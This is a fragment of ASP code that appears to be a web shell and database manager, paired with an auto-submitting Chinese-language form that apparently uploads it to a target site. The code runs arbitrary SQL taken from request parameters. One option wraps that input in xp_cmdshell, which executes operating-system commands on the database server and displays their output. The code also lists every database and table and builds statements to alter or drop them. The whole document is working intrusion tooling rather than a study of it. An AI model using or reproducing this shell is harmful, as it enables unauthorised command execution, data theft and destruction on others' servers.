	if mid(lcase(request("host")),2,1)=":" then
		connectionstring="DRIVER={Microsoft Access Driver (*.mdb)};DBQ="&_
			request("host")&";pwd="&request("upass")
		echo connectionstring
		session("IsMDB")=1
		session("dbo")=""
		session("dsnname")=request("host")
	else
		session("dsnname")=dsnname
		connectionstring = "provider=sqloledb.1;"&dsnname&dsnusername&dsnpassword'&"database="&session("schoolname")
		session("IsMDB")=0
		session("dbo")="[dbo]."
	end if
	session("connectionstring")=connectionstring
end if
echo session("dsnname")&"<br>"
adoconn.open session("connectionstring")
adoconn.cursorlocation=3
if session("IsMDB")=0 then adoconn.execute("use "&session("schoolname"))
command=request("c")
sqlstr=request.form("sqlstr")
table=request("table")
if table="" then table=GetTableFromSQL(sqlstr)


if len(sqlstr)>0 then
		if left(sqlstr,5)="edit " then sprocedure(mid(sqlstr,6)):sqlstr=""
		if left(sqlstr,4)="all " then run_ml(mid(sqlstr,5)):sqlstr=""
		runsqls=split(sqlstr,bbf)
		for k=0 to ubound(runsqls)
			if request("ppp")="rundos" then
				runsqls(k)="exec master.dbo.xp_cmdshell '"&runsqls(k)&"'"

			end if
			echo "<font color=#FF0000>"&runsqls(k)&"</font><br>"
			if len(runsqls(k))>0 then
				set rs=adoconn.execute(runsqls(k))
				if request("sc")<>"n" then
					if request("ppp")<>"rundos" then
						showsss rs
					else
						echo "<tex"&"tarea  rows=15 name=sqlcmd cols=105>"
						for i=1 to rs.recordcount
							reword=rs(0).value
							if reword<>"" then
	reword=replace(reword,"</texta"&"rea>","</_tex"&"tarea>")
	reword=replace(reword,"</TEXTA"&"REA>","</_tex"&"tarea>")
								echo reword&bbf
								
							end if
							rs.movenext
						next
						echo "</texta"&"rea><br>"

					end if
				end if
			end if
		next
response.write "<script>"
response.write "function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<100000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}"
response.write "var tx;"
response.write "tx=document.all.sqlcmd.value;"
response.write "tx=replace(tx,""_tex"&"tarea"",""text"&"area"");"
response.write "document.all.sqlcmd.value=tx;"
response.write "</script>"
end if


if command=1 then
	if session("IsMDB")=1 then
		Set ADOX = Server.CreateObject("ADOX.Catalog")
		ADOX.ActiveConnection = adoconn
		For Each tb in ADOX.Tables
			If tb.Type = "TABLE" Then
			echo "<a href="&request("script_name")&"?c=2&table="& tb.Name&">"
				echo tb.Name&"</a><br>"
End If
		Next
		response.end
	else
		sql="select name from sysobjects where "&_
			"objectproperty(object_id(name),'istable')=1"&session("only_user_table")
		set rs=adoconn.execute(sql)
		for i=1 to rs.recordcount
			echo "<a href="&request("script_name")&"?c=2&table="&rs(0).value&_
				">"&rs(0).value&"</a><br>"
			rs.movenext
		next
	end if
end if

if command=2 then
	if table<>"" then
		set rs=adoconn.execute("select "&sqlss&" * from "&session("dbo")&table)
		showsss rs
		echo "</table>"
		echo "<script>"&scripts&"</script>"&insert
	end if
end if

if command=3 then
	set rs=adoconn.execute("select name,filename from master..sysdatabases")
	echo "<table>"
	for dd=1 to rs.recordcount
		echo "<tr><td><a href="&request("SCRIPT_NAME")&"?database="&rs(0).value&">"&rs(0).value&"</a></td><td>"&rs(1).value&"</td></tr>"
		rs.movenext
	next
	echo "</table>"
end if

if command=100 then session("only_user_table")=" and xtype='u'":response.redirect request("url")&"?c=1"
if command=101 then session("only_user_table")="":response.redirect request("url")&"?c=1"
set adoconn=nothing
function showsss(lprs)
	echo "<table border=1 bordercolorlight=#000000 cellspacing=0 cellpadding=0 bordercolordark=#ffffff>"
	countrs=lprs.fields.count
	
	echo "<tr><td> </td>"
	for i=1 to countrs
		echo "<td>"&lprs(i-1).name&"</td>"
		if i>1 then
			if i<>countrs then
				ins1=ins1&lprs(i-1).name&","
				if session("IsMDB")=1 then
					ins2=ins2&"'0',"
				else
					ins2=ins2&"/*"&lprs(i-1).name&"*/'0',"
				end if
			else
				ins1=ins1&lprs(i-1).name
				if session("IsMDB")=1 then
					ins2=ins2&"'0'"
				else
					ins2=ins2&"/*"&lprs(i-1).name&"*/'0'"
				end if
			end if
		end if
	next
	echo "</tr>"

	echo "<script>function ins(){document.all.sqlstr.value="&chr(34)&"insert into "&_
		session("dbo")&table&_
		"("&ins1&")values("&ins2&")"&chr(34)&";}</script>"
	echo "<script>function sel(){document.all.sqlstr.value="&chr(34)&"select * from "&session("dbo")&table&_
		chr(34)&";}</script>"
	echo "<script>function del(){document.all.sqlstr.value='delete from "&session("dbo")&table&" where [id]=99999';}</script>"
	echo "<script>function drop(){document.all.sqlstr.value='drop table "&session("dbo")&"["&table&"]';}</script>"

	if lprs.recordcount<1 then exit function
	for dd=1 to lprs.recordcount
		lpitem= "<tr><td>"&dd&"</td>"
		update="tt"&dd&"="&chr(34)&"update "&session("dbo")&table&" set "
		for i=1 to countrs
			if i=1 then where="where ["&lprs(i-1).name&"]="&lprs(i-1).value
			if lprs(i-1).type<>204 and lprs(i-1).type<>128 and lprs(i-1).type<>205 then
				ivalue=lprs(i-1).value
				if len(ivalue)>0 then
					ivalue=replace(ivalue,"<","<")
					ivalue=replace(ivalue,"  ","  ")

					svalue=replace(lprs(i-1).value,"\","\\")
					svalue=replace(svalue,chr(34),"\"&chr(34))
					svalue=replace(svalue,chr(39),"\'\'")

					svalue=replace(svalue,"<",chr(34)&"+'<'+"&chr(34))
				end if
				if i>1 then
					if i<countrs then
						update=update&"["&lprs(i-1).name&"]='"&svalue&"', "
					else
						update=update&"["&lprs(i-1).name&"]='"&svalue&"' "
					end if
				end if
				lpitem=lpitem&"<td>" '&ivalue
				lpitem=lpitem&ivalue&" </td>"
			else
				lpitem=lpitem&"<td>{?}</td>"
			end if
		next
		lpitem=lpitem&"</tr>"
		update=replace(update,chr(13)&chr(10),"\n")
		update=replace(update,chr(13),"\n")
		update=replace(update,chr(10),"\n")
		update=update&where&chr(34)&";"&chr(13)&chr(10)
		scripts=scripts&update

		echo "<a ondblclick=javascript:copys(tt"&dd&");>"&lpitem&"</a>"
		lprs.movenext
	next
	echo "</table>"
	echo "<script>"&scripts&"</script>"&insert
end function
function sprocedure(lpstr)
sql="SELECT text FROM syscomments WHERE id = OBJECT_ID('"&lpstr&"') ORDER BY colid"	'colid
	set rs=adoconn.execute(sql)
	if rs.recordcount<1 then exit function
	for dd=1 to rs.recordcount
		procstr=procstr&rs(0).value
		rs.movenext
	next
echo "---------------(+)<br>"&replace(replace(server.htmlencode(procstr),bbf,"<br>"),"  ","  ")&"<br>---------------(-)<br>"
end function
function run_ml(lpstr)
	set rs=adoconn.execute(lpstr)
	showsss rs
end function
echo "</body>"
response.end
end if </textarea><br />
	<input type="submit" name="ax" value="重新上传" /></p>
</form><br><center><font color=ff0000 size=2><b>上传中……请稍候……<br>若长时间无响应请先确认密码及地址是否正确！然后点击重新上传！</b></font></center>
<script language="javascript">ccc();onload=document.all.Kker.submit();</script>
<%end if%>